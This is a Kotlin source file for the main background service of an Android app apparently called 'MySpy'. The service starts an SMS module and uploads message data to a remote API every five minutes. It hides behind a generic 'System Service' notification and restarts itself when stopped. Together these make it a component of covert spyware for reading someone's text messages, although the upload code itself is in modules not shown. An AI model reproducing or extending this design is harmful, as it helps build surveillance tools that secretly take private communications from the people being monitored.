package com.myspy.android.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.myspy.android.data.local.db.AppDatabase
import com.myspy.android.data.local.prefs.PrefsManager
import com.myspy.android.data.remote.api.ApiClient
import com.myspy.android.data.repository.SmsRepository
import com.myspy.android.modules.sms.SmsModule
import kotlinx.coroutines.*

/**
 * Main Foreground Service
 * @author Michael KOJDL
 * @version 1.0.0
 */
class MainService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "myspy_service_channel"
        private const val SYNC_INTERVAL = 5 * 60 * 1000L // 5 minutes

        fun start(context: Context) {
            val intent = Intent(context, MainService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private lateinit var prefsManager: PrefsManager
    private lateinit var smsModule: SmsModule
    private var syncJob: Job? = null

    override fun onCreate() {
        super.onCreate()

        prefsManager = PrefsManager(this)

        // Initialize modules if registered
        if (prefsManager.isRegistered()) {
            initializeModules()
            startPeriodicSync()
        }

        startForeground(NOTIFICATION_ID, createNotification())
    }

    private fun initializeModules() {
        val database = AppDatabase.getInstance(this)
        val apiService = ApiClient.createService(prefsManager)

        // Initialize SMS module
        val smsRepository = SmsRepository(database.smsDao(), apiService)
        smsModule = SmsModule(this, smsRepository)
        smsModule.start()
    }

    private fun startPeriodicSync() {
        syncJob = scope.launch {
            while (isActive) {
                try {
                    if (::smsModule.isInitialized) {
                        smsModule.syncData()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                delay(SYNC_INTERVAL)
            }
        }
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        syncJob?.cancel()
        scope.cancel()

        if (::smsModule.isInitialized) {
            smsModule.stop()
        }
    }
}
